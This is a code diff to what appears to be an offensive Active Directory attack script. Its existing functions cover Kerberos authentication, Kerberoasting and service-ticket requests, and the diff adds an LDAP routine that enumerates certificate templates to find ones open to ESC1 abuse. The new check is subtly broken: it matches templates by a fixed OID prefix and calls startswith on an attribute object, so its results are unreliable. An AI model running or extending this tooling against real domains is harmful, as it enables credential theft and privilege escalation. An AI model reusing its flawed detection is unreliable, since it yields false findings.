@@ -1,5 +1,7 @@
 from impacket.krb5.types import Principal
 from impacket.smbconnection import SMBConnection
+from ldap3 import Server, Connection, SUBTREE
+
 
 def kerberos_auth(username, password, domain, dc_ip):
     try:
@@ -19,7 +21,7 @@ def kerberos_auth(username, password, domain, dc_ip):
     except Exception as e:
         print(f"Error during Kerberos authentication: {e}")
         return False
-        
+
 def kerberoast(domain, username, password, dc_ip):
     try:
         print(f"Attempting to Kerberoast accounts from {dc_ip}")
@@ -95,6 +97,38 @@ def request_service_ticket(krbctx, krbtgt, target_user):
     except Exception as e:
         print(f"Error while requesting service ticket: {e}")
         return None
+
+def check_esc1_certificates(username, password, domain, dc_ip):
+    try:
+        # Connect to the Domain Controller via LDAP
+        server = Server(dc_ip)
+        conn = Connection(server, user=f"{domain}\\{username}", password=password)
+        conn.bind()
+
+        # Search for ESC1 certificate templates
+        conn.search(search_base='CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' +
+                                  ','.join(f"DC={dc}" for dc in domain.split('.')),
+                     search_filter='(objectClass=pKICertificateTemplate)',
+                     search_scope=SUBTREE,
+                     attributes=['displayName', 'msPKI-Certificate-Template-OID'])
+
+        esc1_templates = []
+        for entry in conn.entries:
+            if entry['msPKI-Certificate-Template-OID'].startswith('1.3.6.1.4.1.311.21.8.106'):
+                esc1_templates.append(entry['displayName'].value)
+
+        if esc1_templates:
+            print("ESC1 Certificate Templates found:")
+            for template in esc1_templates:
+                print(template)
+        else:
+            print("No ESC1 Certificate Templates found.")
+
+        conn.unbind()
+
+    except Exception as e:
+        print(f"Error while checking ESC1 certificates: {e}")
+
 
 # Example usage:
 username = input("Enter username: ")
